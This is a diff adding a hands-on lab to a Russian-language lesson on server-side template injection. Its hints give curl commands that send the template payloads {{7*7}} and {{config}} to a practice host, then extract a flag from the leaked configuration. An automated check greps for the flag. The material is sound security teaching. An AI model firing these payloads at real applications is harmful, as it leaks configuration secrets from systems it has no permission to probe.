@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как обнаружить SSTI, определить движок шаблонов и дойти от {{7*7}} до выполнения команд."
+lab:
+  kind: shell
+  title: "Практика: Server-Side Template Injection"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Проверь исполнение шаблона: `curl -s -G http://vuln.lab.local/render --data-urlencode 'name={{7*7}}'` — должно быть `Hello 49`.
+    - Это подтверждает SSTI. Теперь попроси конфиг: `--data-urlencode 'name={{config}}'`.
+    - В конфиге есть строка `FLAG=`.
+    - Достань: `... | grep FLAG | cut -d= -f2 > found.txt`.
 ---
 
 ## Вопрос, с которого всё начинается
